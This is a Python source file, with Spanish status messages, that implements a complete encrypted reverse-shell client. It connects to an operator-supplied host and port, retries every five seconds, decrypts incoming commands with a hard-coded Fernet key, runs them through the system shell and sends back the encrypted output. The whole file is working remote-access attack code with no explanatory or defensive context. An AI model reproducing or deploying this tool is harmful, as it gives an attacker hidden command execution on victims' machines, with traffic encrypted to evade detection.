import socket
import subprocess
import time
import struct
from cryptography.fernet import Fernet

KEY = b"KI47J7RwYu5guRVjg1sdMAT6JDCZB5eMWWB5zVuC5GE="
f = Fernet(KEY)


def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Conexión cerrada")
        data += chunk
    return data

def send_enc(sock, text):
    encrypted = f.encrypt(text.encode())
    sock.sendall(struct.pack(">I", len(encrypted)) + encrypted)

def recv_enc(sock):
    length = struct.unpack(">I", recv_exact(sock, 4))[0]
    return f.decrypt(recv_exact(sock, length)).decode()


def ejecutar(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        output = r.stdout + r.stderr
        return output if output.strip() else "[*] Sin output"
    except subprocess.TimeoutExpired:
        return "[!] Timeout"
    except Exception as e:
        return f"[!] Error: {str(e)}"


def conectar(host, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            print(f"[*] Conectado a {host}:{port}")
            return sock
        except:
            print("[!] Reintentando en 5s...")
            time.sleep(5)


def main():
    host = input("Host: ")
    port = int(input("Port: "))

    sock = conectar(host, port)

    while True:
        try:
            cmd = recv_enc(sock)
            if cmd == "exit":
                break
            send_enc(sock, ejecutar(cmd))
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[!] Conexión perdida: {e}")
            sock = conectar(host, port)

    sock.close()


if __name__ == "__main__":
    main()